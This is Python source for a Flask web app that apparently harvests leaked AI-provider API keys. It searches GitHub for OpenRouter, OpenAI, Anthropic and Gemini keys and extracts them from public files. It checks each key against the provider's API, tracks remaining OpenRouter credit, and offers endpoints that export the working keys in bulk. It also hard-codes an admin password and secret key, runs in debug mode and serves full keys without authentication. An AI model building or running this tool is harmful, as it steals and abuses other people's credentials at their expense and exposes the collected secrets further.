#!/usr/bin/env python3
"""
OpenRouter API Key Scanner
Version: 1.0.0
"""
from flask import Flask, render_template, jsonify, request, session
from flask_cors import CORS
from datetime import datetime, timedelta

__version__ = '1.0.0'

app = Flask(__name__)
app.config['SECRET_KEY'] = 'rebuild-minimal-secret'
CORS(app)

import logging
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')

# 管理员密码（按你的要求硬编码）
ADMIN_PASSWORD = 'Lcg040510.'

import sqlite3, os, json, threading, time, re, requests, random
from urllib import request as urlreq, error as urlerr
DB_PATH = os.path.join(os.path.dirname(__file__), 'app.db')

# --- Persistence layer ---
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS settings (k TEXT PRIMARY KEY, v TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS keys (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        key_value TEXT UNIQUE,
        key_type TEXT,
        status TEXT,
        found_at TEXT,
        last_checked TEXT,
        balance REAL DEFAULT 0
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS metrics_minutely (
        bucket TEXT PRIMARY KEY,
        total INTEGER DEFAULT 0,
        gemini_valid INTEGER DEFAULT 0,
        gemini_429 INTEGER DEFAULT 0
    )''')
    conn.commit(); conn.close()
# 初始化数据库（确保在调用 _get_setting 之前）
init_db()

# ---- Default scan queries (broad but useful; noise reduced by -path and code blacklist) ----
DEFAULT_QUERIES = [
    # OpenRouter
    '"sk-or-v1-" extension:env -path:docs -path:doc -path:example -path:examples -path:samples -path:sample -path:test -path:tests -path:spec',
    '"sk-or-" filename:.env -path:docs -path:example -path:examples -path:test -path:tests',
    '"OPENROUTER_API_KEY" -path:docs -path:example -path:examples -path:test -path:tests',
    'openrouter api key filename:config.* -path:docs -path:example -path:examples',
    '"sk-or-" extension:js -path:docs -path:example -path:examples -path:test -path:tests',
    '"sk-or-" extension:ts -path:docs -path:example -path:examples -path:test -path:tests',
    '"sk-or-" extension:py -path:docs -path:example -path:examples -path:test -path:tests',
    '"sk-or-" extension:json -path:docs -path:example -path:examples -path:test -path:tests -path:spec',
    '"sk-or-" extension:yaml -path:docs -path:example -path:examples -path:test -path:tests',
    '"sk-or-" extension:yml -path:docs -path:example -path:examples -path:test -path:tests',

    # OpenAI
    '"OPENAI_API_KEY" -path:docs -path:example -path:examples -path:test -path:tests',
    'openai.api_key extension:py -path:docs -path:example -path:examples -path:test -path:tests',
    '"sk-" filename:.env -path:docs -path:example -path:examples -path:test -path:tests',
    '"sk-" extension:js -path:docs -path:example -path:examples -path:test -path:tests',
    '"sk-" extension:ts -path:docs -path:example -path:examples -path:test -path:tests',
    '"sk-" extension:json -path:docs -path:example -path:examples -path:test -path:tests -path:spec',
    '"sk-" extension:yaml -path:docs -path:example -path:examples -path:test -path:tests',
    '"sk-" extension:yml -path:docs -path:example -path:examples -path:test -path:tests',

    # Anthropic
    '"ANTHROPIC_API_KEY" -path:docs -path:example -path:examples -path:test -path:tests',
    '"sk-ant-" extension:env -path:docs -path:example -path:examples -path:test -path:tests',
    '"sk-ant-" extension:py -path:docs -path:example -path:examples -path:test -path:tests',

    # Gemini / Google
    '"GEMINI_API_KEY" -path:docs -path:example -path:examples -path:test -path:tests',
    '"GOOGLE_API_KEY" -path:docs -path:example -path:examples -path:test -path:tests',
    'AIza filename:.env -path:docs -path:example -path:examples -path:test -path:tests',
    'AIza extension:js -path:docs -path:example -path:examples -path:test -path:tests',

    # Common env/config files
    'filename:.env.production -path:docs -path:example -path:examples -path:test -path:tests',
    'filename:.env.local -path:docs -path:example -path:examples -path:test -path:tests',
    'filename:.env.development -path:docs -path:example -path:examples -path:test -path:tests',
    'filename:.env.sample -path:docs -path:example -path:examples -path:test -path:tests',

    # Misc variations
    'api_key OPENAI extension:py -path:docs -path:example -path:examples -path:test -path:tests',
    'apiKey OPENAI extension:js -path:docs -path:example -path:examples -path:test -path:tests',
    'Authorization "Bearer sk-" -path:docs -path:example -path:examples -path:test -path:tests',
]

def ensure_defaults():
    if _get_setting('scan_queries', None) in (None, []):
        _set_setting('scan_queries', DEFAULT_QUERIES)
    if _get_setting('scan_interval', None) is None:
        _set_setting('scan_interval', 60)
    if _get_setting('max_results_per_query', None) is None:
        _set_setting('max_results_per_query', 100)
    if _get_setting('prefer_recent', None) is None:
        _set_setting('prefer_recent', True)
    if _get_setting('recent_days', None) is None:
        _set_setting('recent_days', 30)
    if _get_setting('github_tokens', None) is None:
        _set_setting('github_tokens', [])

def _set_setting(k: str, v):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO settings (k, v) VALUES (?,?)', (k, json.dumps(v)))
    conn.commit(); conn.close()


def _get_setting(k: str, default=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT v FROM settings WHERE k=?', (k,))
    row = c.fetchone(); conn.close()
    if not row: return default
    try:
        return json.loads(row[0])
    except Exception:
        return default

# Call ensure_defaults after defining the helper functions
ensure_defaults()

# Global variables for monitoring
scanner_status = {
    'is_running': False,
    'last_scan_start': None,
    'last_scan_end': None,
    'current_query': None,
    'scanned_count': 0,
    'keys_found_session': 0,
    'errors': []
}

@app.route('/api/config', methods=['GET'])
def api_config_get():
    return jsonify({
        'github_tokens': _get_setting('github_tokens', []),
        'scan_queries': _get_setting('scan_queries', []),
        'scan_interval': _get_setting('scan_interval', 60),
        'max_results_per_query': _get_setting('max_results_per_query', 100),
        'prefer_recent': _get_setting('prefer_recent', True),
        'recent_days': _get_setting('recent_days', 30),
    })

# --- Validation utilities ---
VALIDATE_CFG = {
    'openai': {
        'url': 'https://api.openai.com/v1/models',
            'headers': lambda k: {'Authorization': f'Bearer {k}'},
    },
    'openrouter': {
        'url': 'https://openrouter.ai/api/v1/models',
            'headers': lambda k: {'Authorization': f'Bearer {k}'},
    },
    'anthropic': {
        'url': 'https://api.anthropic.com/v1/models',
        'headers': lambda k: {'x-api-key': k, 'anthropic-version': '2023-06-01'},
    },
    'gemini': {
        'url': 'https://generativelanguage.googleapis.com/v1/models',
        'headers': lambda k: {},  # key via query param
    }
}

def _validate_openrouter_key(kv: str) -> int:
    """使用实际聊天API验证OpenRouter密钥"""
    import requests
    
    headers = {
        'Authorization': f'Bearer {kv}',
        'Content-Type': 'application/json',
        'HTTP-Referer': 'https://github.com',
        'X-Title': 'Key Validation Test'
    }
    
    # 使用免费模型进行测试
    payload = {
        'model': 'meta-llama/llama-3.2-1b-instruct:free',
        'messages': [{'role': 'user', 'content': 'test'}],
        'max_tokens': 1
    }
    
    try:
        response = requests.post(
            'https://openrouter.ai/api/v1/chat/completions',
            headers=headers, 
            json=payload, 
            timeout=15
        )
        return response.status_code
    except Exception:
        return -1

def validate_key_once(kv: str, kt: str) -> int:
    kt = (kt or '').lower()
    
    # 特殊处理OpenRouter - 使用实际聊天API验证
    if kt == 'openrouter':
        return _validate_openrouter_key(kv)
    
    cfg = VALIDATE_CFG.get(kt)
    if not cfg:
        return -1
    try:
        if kt == 'gemini':
            url = f"{cfg['url']}?key={urlreq.quote(kv)}"
            code, _ = _http_get(url, None, 10)
        else:
            code, _ = _http_get(cfg['url'], None, 10)  # build Request manually to add headers
            # Re-do with headers (urllib doesn't allow headers on _http_get currently for custom)
            req = urlreq.Request(cfg['url'])
            for hk, hv in cfg['headers'](kv).items():
                req.add_header(hk, hv)
            with urlreq.urlopen(req, timeout=10) as resp:
                code = resp.status
        return int(code)
    except urlerr.HTTPError as e:
        return int(e.code)
    except Exception:
        return -1


def _update_key_status(kv: str, status_code: int, kt: str):
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    conn = sqlite3.connect(DB_PATH); c = conn.cursor()
    c.execute("UPDATE keys SET status=?, last_checked=? WHERE key_value=?", (str(status_code), now, kv))
    conn.commit(); conn.close()
    # metrics for gemini
    if (kt or '').lower() == 'gemini':
        if status_code == 200:
            _bump_metric(delta_valid=1)
        elif status_code == 429:
            _bump_metric(delta_429=1)


def pick_keys_for_validation(limit=50, stale_minutes=60):
    cutoff = (datetime.now() - timedelta(minutes=stale_minutes)).strftime('%Y-%m-%d %H:%M:%S')
    conn = sqlite3.connect(DB_PATH); c = conn.cursor()
    c.execute("SELECT key_value, key_type, last_checked FROM keys WHERE last_checked IS NULL OR last_checked<? LIMIT ?", (cutoff, limit))
    rows = c.fetchall(); conn.close()
    return rows

# --- OpenRouter balance refresher (placeholder lightweight) ---

def _fetch_openrouter_credits(token: str) -> float:
    """使用正确的/key端点查询OpenRouter余额"""
    import requests
    
    try:
        headers = {
            'Authorization': f'Bearer {token}',
            'Accept': 'application/json'
        }
        
        response = requests.get('https://openrouter.ai/api/v1/key', 
                              headers=headers, timeout=12)
        
        if response.status_code != 200:
            return 0.0
            
        data = response.json()
        
        # 根据官方文档格式解析
        if isinstance(data, dict) and 'data' in data:
            key_data = data['data']
            
            # 计算剩余额度
            limit = key_data.get('limit')  # 总额度，null表示无限
            usage = key_data.get('usage', 0)  # 已使用额度
            
            if limit is None:
                # 无限额度，返回一个大数值表示
                return 999999.0
            elif limit > 0:
                # 有限额度，返回剩余额度
                remaining = max(0, limit - usage)
                return float(remaining)
            else:
                return 0.0
        
        return 0.0
    except Exception as e:
        logging.debug(f"OpenRouter余额查询失败: {str(e)}")
        return 0.0


def refresh_openrouter_balance():
    conn = sqlite3.connect(DB_PATH); c = conn.cursor()
    c.execute("SELECT DISTINCT key_value FROM keys WHERE key_type='openrouter'")
    rows = c.fetchall()
    for (kv,) in rows:
        try:
            bal = _fetch_openrouter_credits(kv)
            c.execute("UPDATE keys SET balance=? WHERE key_value=?", (bal, kv))
            conn.commit()
        except Exception:
            pass
    conn.close()


def balance_loop():
    while True:
        refresh_openrouter_balance()
        time.sleep(600)  # every 10 minutes

threading.Thread(target=balance_loop, daemon=True).start()


def validator_loop():
    while True:
        rows = pick_keys_for_validation(limit=50, stale_minutes=60)
        if not rows:
            time.sleep(10); continue
        for kv, kt, _last in rows:
            code = validate_key_once(kv, kt)
            _update_key_status(kv, code, kt)
            time.sleep(0.2)  # gentle pace

# 启动验证线程
threading.Thread(target=validator_loop, daemon=True).start()



@app.route('/api/config', methods=['POST'])
def api_config_set():
    if not session.get('is_admin'):
        return jsonify({'status':'unauthorized'}), 401
    data = request.get_json(force=True, silent=True) or {}
    def norm_list(v):
        if isinstance(v, str):
            v = [s.strip() for s in v.replace('\n', ',').split(',') if s.strip()]
        return v or []
    _set_setting('github_tokens', norm_list(data.get('github_tokens')))
    _set_setting('scan_queries', norm_list(data.get('scan_queries')))
    if 'scan_interval' in data: _set_setting('scan_interval', int(data['scan_interval']))
    if 'max_results_per_query' in data: _set_setting('max_results_per_query', int(data['max_results_per_query']))
    if 'prefer_recent' in data: _set_setting('prefer_recent', bool(data['prefer_recent']))
    if 'recent_days' in data: _set_setting('recent_days', int(data['recent_days']))
    return jsonify({'status':'success'})

# --- Scanner utilities ---
GITHUB_API = 'https://api.github.com/search/code?q={q}&per_page={pp}&page={p}'
RAW_MAIN = 'https://raw.githubusercontent.com/{repo}/main/{path}'
RAW_MASTER = 'https://raw.githubusercontent.com/{repo}/master/{path}'

PROVIDER_PATTERNS = {
    'openrouter': re.compile(r'(sk-or-[A-Za-z0-9\-_]{20,80})'),
    'openai': re.compile(r'(sk-[A-Za-z0-9]{20,60})'),
    'anthropic': re.compile(r'(sk-ant-[A-Za-z0-9\-_]{20,80})'),
    'gemini': re.compile(r'(AIza[0-9A-Za-z\-_]{20,80})')
}

BLACKLIST = ['docs','doc','example','examples','sample','samples','test','tests','spec']


def _save_key(kv: str, kt: str):
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    try:
        c.execute("INSERT OR IGNORE INTO keys (key_value, key_type, status, found_at, last_checked, balance) VALUES (?,?,?,?,?,?)",
                  (kv, kt, None, now, None, 0))
        conn.commit()
    finally:
        conn.close()


def _bump_metric(delta_total=0, delta_valid=0, delta_429=0):
    b = datetime.now().strftime('%Y-%m-%d %H:%M')
    conn = sqlite3.connect(DB_PATH); c = conn.cursor()
    c.execute("SELECT bucket,total,gemini_valid,gemini_429 FROM metrics_minutely WHERE bucket=?", (b,))
    row = c.fetchone()
    if not row:
        c.execute("INSERT INTO metrics_minutely (bucket,total,gemini_valid,gemini_429) VALUES (?,?,?,?)",
                  (b, max(0,delta_total), max(0,delta_valid), max(0,delta_429)))

    else:
        c.execute("UPDATE metrics_minutely SET total=total+?, gemini_valid=gemini_valid+?, gemini_429=gemini_429+? WHERE bucket=?",
                  (max(0,delta_total), max(0,delta_valid), max(0,delta_429), b))
    conn.commit(); conn.close()


def _http_get(url, token=None, timeout=12):
    import requests
    try:
        headers = {'Accept': 'application/vnd.github.v3+json'}
        if token:
            headers['Authorization'] = f'token {token}'
        
        response = requests.get(url, headers=headers, timeout=timeout)
        return response.status_code, response.content
        
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed: {str(e)}")
        return -1, b''
    except Exception as e:
        logging.error(f"Unexpected error: {str(e)}")
        return -1, b''


def _fetch_raw(repo, path):
    import requests
    for raw in [RAW_MAIN.format(repo=repo, path=path), RAW_MASTER.format(repo=repo, path=path)]:
        try:
            response = requests.get(raw, timeout=10)
            if response.status_code == 200:
                return response.text
        except Exception as e:
            logging.debug(f"Failed to fetch {raw}: {str(e)}")
            continue
    return ''


def _extract(content: str):
    found = []
    for t, pat in PROVIDER_PATTERNS.items():
        for m in pat.findall(content or ''):
            found.append((t, m))
    return found


manual_scan_requested = False

def scanner_loop():
    global manual_scan_requested
    
    # Example风格的扫描器组件
    class TokenRotator:
        def __init__(self, tokens):
            self.tokens = [t.strip() for t in tokens if t.strip()]
            self._token_ptr = 0
        
        def next_token(self):
            if not self.tokens:
                return None
            token = self.tokens[self._token_ptr % len(self.tokens)]
            self._token_ptr += 1
            return token.strip()
    
    class GitHubSearcher:
        def __init__(self, token_rotator):
            self.token_rotator = token_rotator
        
        def search_for_keys(self, query, max_retries=5):
            for attempt in range(1, max_retries + 1):
                token = self.token_rotator.next_token()
                if not token:
                    return None
                
                headers = {
                    "Accept": "application/vnd.github.v3+json",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Authorization": f"token {token}"
                }
                
                params = {"q": query, "per_page": 100, "page": 1}
                
                try:
                    response = requests.get("https://api.github.com/search/code", headers=headers, params=params, timeout=30)
                    
                    if response.status_code == 200:
                        result = response.json()
                        items = result.get('items', [])
                        logging.info(f"🔍 Search success: [{query[:40]}...] items={len(items)}")
                        return result
                    elif response.status_code in (403, 429):
                        wait_time = min(2 ** attempt + random.uniform(0, 1), 60)
                        if attempt < max_retries:
                            logging.warning(f"⚠️ Rate limit (attempt {attempt}/{max_retries}) - waiting {wait_time:.1f}s")
                            time.sleep(wait_time)
                            continue
                        else:
                            return None
                    else:
                        if attempt < max_retries:
                            time.sleep(2)
                            continue
                except Exception as e:
                    if attempt < max_retries:
                        time.sleep(2)
                        continue
            return None
        
        def get_file_content(self, item):
            repo = item["repository"]["full_name"]
            path = item["path"]
            
            for branch in ['main', 'master']:
                raw_url = f"https://raw.githubusercontent.com/{repo}/{branch}/{path}"
                try:
                    response = requests.get(raw_url, timeout=10)
                    if response.status_code == 200:
                        return response.text
                except:
                    continue
            return None
    
    # SHA去重和过滤逻辑
    scanned_shas = set()
    blacklist = ['readme', 'docs/', 'doc/', 'example', 'sample', 'test', 'spec', 'demo']
    
    def should_skip_item(item):
        # SHA去重
        if item.get("sha") in scanned_shas:
            return True, "sha_duplicate"
        
        # 文档过滤
        path_lower = item["path"].lower()
        if any(token in path_lower for token in blacklist):
            return True, "doc_filter"
        
        # 仓库年龄
        repo_pushed_at = item["repository"].get("pushed_at")
        if repo_pushed_at:
            try:
                repo_dt = datetime.strptime(repo_pushed_at, "%Y-%m-%dT%H:%M:%SZ")
                if repo_dt < datetime.utcnow() - timedelta(days=730):
                    return True, "age_filter"
            except:
                pass
        
        return False, ""
    
    def extract_and_filter_keys(content):
        raw_keys = []
        for provider, pattern in PROVIDER_PATTERNS.items():
            matches = pattern.findall(content or '')
            for match in matches:
                raw_keys.append((provider, match))
        
        # Example的上下文过滤
        filtered_keys = []
        for provider, key in raw_keys:
            if len(key) < 20:
                continue
            
            context_index = content.find(key)
            if context_index != -1:
                snippet = content[context_index:context_index + 45]
                if "..." in snippet or "YOUR_" in snippet.upper():
                    continue
                if any(placeholder in snippet.upper() for placeholder in ['REPLACE', 'EXAMPLE', 'DEMO', 'TEST']):
                    continue
            
            filtered_keys.append((provider, key))
        
        return filtered_keys
    
    # 主循环
    logging.info("🎪 EXAMPLE-BASED SCANNER STARTED")
    
    while True:
        try:
            # 获取配置
            tokens = _get_setting('github_tokens', [])
            queries = _get_setting('scan_queries', [])
            recent_days = int(_get_setting('recent_days', 365) or 365)
            
            if not tokens or not queries:
                logging.warning("❌ No tokens or queries configured")
                time.sleep(10)
                continue
            
            # 初始化组件
            token_rotator = TokenRotator(tokens)
            searcher = GitHubSearcher(token_rotator)
            
            # 开始扫描
            scanner_status['is_running'] = True
            scanner_status['last_scan_start'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            scanner_status['scanned_count'] = 0
            scanner_status['keys_found_session'] = 0
            
            logging.info(f"🚀 Scan cycle: {len(queries)} queries, {len(tokens)} tokens")
            
            # Example风格的查询处理
            for query_index, query in enumerate(queries, 1):
                scanner_status['current_query'] = query[:50]
                
                # 不使用时间过滤器，直接搜索
                logging.info(f"📊 Query {query_index}/{len(queries)}: {query}")
                
                # Example的搜索逻辑
                search_result = searcher.search_for_keys(query)
                if not search_result:
                    logging.warning(f"⚠️ Search failed: {query}")
                    continue
                
                items = search_result.get('items', [])
                if not items:
                    logging.info(f"📭 No items: {query}")
                    continue
                
                query_scanned = 0
                query_keys = 0
                
                # Example的item处理循环
                for item_index, item in enumerate(items, 1):
                    # 跳过检查
                    should_skip, skip_reason = should_skip_item(item)
                    if should_skip:
                        continue
                    
                    # 添加到已扫描SHA
                    scanned_shas.add(item.get("sha"))
                    
                    # 获取文件内容
                    content = searcher.get_file_content(item)
                    if not content:
                        continue
                    
                    # 更新计数器
                    query_scanned += 1
                    scanner_status['scanned_count'] += 1
                    
                    # Example的密钥提取和过滤
                    keys = extract_and_filter_keys(content)
                    if keys:
                        repo_name = item["repository"]["full_name"]
                        file_path = item["path"]
                        
                        logging.info(f"🔑 Found {len(keys)} keys in {repo_name}/{file_path}")
                        
                        for key_type, key_value in keys:
                            # 保存到数据库
                            now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            _save_key(key_value, key_type)
                            
                            # 验证密钥（简化版）
                            try:
                                validation_result = validate_key_once(key_value, key_type)
                                _update_key_status(key_value, validation_result, key_type)
                                
                                if validation_result == 200:
                                    query_keys += 1
                                    scanner_status['keys_found_session'] += 1
                                    logging.info(f"✅ Valid {key_type}: {key_value[:20]}...")
                                elif validation_result == 429:
                                    logging.warning(f"⚠️ Rate limited {key_type}: {key_value[:20]}...")
                                else:
                                    logging.info(f"❌ Invalid {key_type}: {key_value[:20]}...")
                            except Exception as e:
                                logging.error(f"Validation error: {str(e)[:30]}")
                    
                    # 平衡的延迟控制 - 既稳定又不太慢
                    time.sleep(random.uniform(1.5, 3))
                
                logging.info(f"✅ Query {query_index} complete: scanned={query_scanned}, keys={query_keys}")
                
                # Query间适中延迟，平衡速度与稳定性
                time.sleep(random.uniform(1, 2))
            
            # 扫描周期结束
            scanner_status['is_running'] = False
            scanner_status['last_scan_end'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            scanner_status['current_query'] = None
            
            logging.info(f"🏁 Cycle complete: scanned={scanner_status['scanned_count']}, keys={scanner_status['keys_found_session']}")
            
            # 24*7运行的SHA缓存管理 - 保持更大缓存提高去重效率
            if len(scanned_shas) > 50000:  # 增大缓存限制
                # 保留最近的30000个SHA，提供更好的去重效果
                scanned_shas = set(list(scanned_shas)[-30000:])
                logging.info(f"🗑️ SHA cache cleaned: kept 30K recent SHAs")
            
            # 检查手动扫描请求
            if manual_scan_requested:
                manual_scan_requested = False
                logging.info("🔄 Manual scan requested, starting immediately...")
                continue
            
            # 24*7运行模式 - 使用配置的扫描间隔
            scan_interval = _get_setting('scan_interval', 120)  # 默认120秒
            logging.info(f"😴 Cycle complete. Next cycle in {scan_interval} seconds...")
            time.sleep(scan_interval)
            
        except KeyboardInterrupt:
            logging.info("⛔ Scanner interrupted")
            break
        except Exception as e:
            logging.error(f"💥 Scanner error: {str(e)}")
            time.sleep(5)
            continue



# 启动后台扫描线程
threading.Thread(target=scanner_loop, daemon=True).start()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/keys_grouped')
def api_keys_grouped():
    # 读库组装
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT key_value, key_type, status, found_at, last_checked, balance FROM keys ORDER BY found_at DESC")
    grouped = { 'openrouter':[], 'openai':[], 'anthropic':[], 'gemini':[] }
    for row in c.fetchall():
        k = {
            'key': row[0],
            'type': row[1],
            'status': row[2],
            'found_at': row[3],
            'last_checked': row[4],
            'balance': row[5],
            'key_display': (row[0][:15] + '...' + row[0][-5:]) if row[0] and len(row[0])>20 else row[0]
        }
        t = (row[1] or '').lower()
        grouped.setdefault(t, []).append(k)
    conn.close()
    return jsonify(grouped)

@app.route('/api/keys')
def api_keys():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT key_value, key_type, status, found_at, last_checked, balance FROM keys ORDER BY found_at DESC")
    flat = []
    for row in c.fetchall():
        flat.append({
            'key': row[0], 'type': row[1], 'status': row[2], 'found_at': row[3], 'last_checked': row[4], 'balance': row[5],
            'key_display': (row[0][:15] + '...' + row[0][-5:]) if row[0] and len(row[0])>20 else row[0]
        })
    conn.close()
    return jsonify(flat)

@app.route('/api/stats')
def api_stats():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # by_type - 所有密钥按类型统计
    c.execute("SELECT key_type, COUNT(*) FROM keys GROUP BY key_type")
    by_type = { (r[0] or 'unknown').lower(): r[1] for r in c.fetchall() }
    
    # by_status - 所有密钥按状态统计
    c.execute("SELECT status, COUNT(*) FROM keys GROUP BY status")
    by_status = {}
    for status, count in c.fetchall():
        status_key = str(status) if status is not None else 'unknown'
        by_status[status_key] = count
    
    # 计算有效密钥总数 (状态为200的所有类型)
    total_valid = by_status.get('200', 0)
    total_429 = by_status.get('429', 0)
    total_forbidden = by_status.get('403', 0)
    
    # openrouter usage（以 balance 汇总）
    c.execute("SELECT SUM(COALESCE(balance,0)) FROM keys WHERE key_type='openrouter'")
    or_usage = c.fetchone()[0] or 0
    
    # trends 最近24小时 - 修改为通用统计而不只是gemini
    c.execute("SELECT bucket, total, gemini_valid, gemini_429 FROM metrics_minutely")
    rows = c.fetchall()
    conn.close()
    
    from collections import OrderedDict
    trend_total = OrderedDict(); trend_valid = OrderedDict(); trend_429 = OrderedDict()
    now = datetime.now(); keys = [ (now - timedelta(minutes=i)).strftime('%Y-%m-%d %H:%M') for i in range(24*60) ]
    for k in reversed(keys):
        trend_total[k] = 0; trend_valid[k]=0; trend_429[k]=0
    for b, t, v, r429 in rows:
        if b in trend_total:
            trend_total[b] = t; trend_valid[b] = v; trend_429[b] = r429
    
    return jsonify({
        'by_type': by_type,
        'by_status': by_status,
        'total_valid': total_valid,
        'total_429': total_429,
        'total_forbidden': total_forbidden,
        'openrouter_usage_total': or_usage,
        'trend_total': trend_total,
        'trend_valid': trend_valid,  # 保持兼容性，但实际是gemini数据
        'trend_429': trend_429,      # 保持兼容性，但实际是gemini数据
    })

@app.route('/api/keys/export/<provider>')
@app.route('/api/keys/export/<provider>/<status>')
def api_export_keys(provider, status=None):
    """Export keys as text file with optional status filter"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Build query based on provider and status
    if provider == 'all':
        if status:
            if status == 'other':
                c.execute("SELECT key_value, key_type FROM keys WHERE status NOT IN ('200', '403', '429') ORDER BY key_type, found_at DESC")
            else:
                c.execute("SELECT key_value, key_type FROM keys WHERE status=? ORDER BY key_type, found_at DESC", (status,))
        else:
            c.execute("SELECT key_value, key_type FROM keys ORDER BY key_type, found_at DESC")
    elif provider == 'valid':
        c.execute("SELECT key_value, key_type FROM keys WHERE status='200' ORDER BY key_type, found_at DESC")
    else:
        if status:
            if status == 'other':
                c.execute("SELECT key_value, key_type FROM keys WHERE key_type=? AND status NOT IN ('200', '403', '429') ORDER BY found_at DESC", (provider,))
            else:
                c.execute("SELECT key_value, key_type FROM keys WHERE key_type=? AND status=? ORDER BY found_at DESC", (provider, status))
        else:
            c.execute("SELECT key_value, key_type FROM keys WHERE key_type=? ORDER BY found_at DESC", (provider,))
    
    rows = c.fetchall()
    conn.close()
    
    # Format as text - only keys, no status
    lines = []
    current_type = None
    
    for key, key_type in rows:
        if key_type != current_type:
            if lines:
                lines.append("")  # Empty line between types
            lines.append(f"# {(key_type or 'unknown').upper()} KEYS")
            lines.append("=" * 50)
            current_type = key_type
        
        # Only add the key value, no status
        lines.append(key)
    
    content = "\n".join(lines)
    
    # Return as downloadable text file
    from flask import Response
    response = Response(content, mimetype='text/plain')
    
    # Include status in filename if filtered
    status_part = f"_{status}" if status else ""
    filename = f"keys_{provider}{status_part}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    response.headers['Content-Disposition'] = f'attachment; filename="{filename}"'
    return response

@app.route('/api/keys/copy/<provider>')
def api_copy_keys(provider):
    """Get keys for copying (returns full keys in JSON)"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    # Get keys for specific provider or all
    if provider == 'all':
        c.execute("SELECT key_value, key_type, status FROM keys ORDER BY key_type, found_at DESC")
    elif provider == 'valid':
        c.execute("SELECT key_value, key_type, status FROM keys WHERE status='200' ORDER BY key_type, found_at DESC")
    else:
        c.execute("SELECT key_value, key_type, status FROM keys WHERE key_type=? ORDER BY found_at DESC", (provider,))
    
    rows = c.fetchall()
    conn.close()
    
    # Group by type
    grouped = {}
    for key, key_type, status in rows:
        type_name = (key_type or 'unknown').lower()
        if type_name not in grouped:
            grouped[type_name] = []
        grouped[type_name].append({
            'key': key,
            'status': status
        })
    
    return jsonify({
        'keys': grouped,
        'total': len(rows)
    })

@app.route('/api/scanner/status')
def api_scanner_status():
    """Get current scanner status"""
    return jsonify({
        'is_running': scanner_status['is_running'],
        'last_scan_start': scanner_status['last_scan_start'],
        'last_scan_end': scanner_status['last_scan_end'],
        'current_query': scanner_status['current_query'],
        'scanned_count': scanner_status['scanned_count'],
        'keys_found_session': scanner_status['keys_found_session'],
        'errors': scanner_status['errors'][-10:],  # Last 10 errors
        'github_tokens_configured': len(_get_setting('github_tokens', [])) > 0,
        'scan_interval': _get_setting('scan_interval', 60)
    })

@app.route('/api/scanner/trigger', methods=['POST'])
def api_scanner_trigger():
    """Manually trigger a scan (admin only)"""
    if not session.get('is_admin'):
        return jsonify({'status':'unauthorized'}), 401
    
    # Set a flag to trigger immediate scan
    global manual_scan_requested
    manual_scan_requested = True
    return jsonify({'status': 'scan triggered'})

@app.route('/api/admin/login', methods=['POST'])
def api_admin_login():
    data = request.get_json(force=True, silent=True) or {}
    pwd = (data.get('password') or '').strip()
    if pwd == ADMIN_PASSWORD:
        session['is_admin'] = True
        return jsonify({'ok': True})
    return jsonify({'ok': False}), 401

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4567, debug=True)

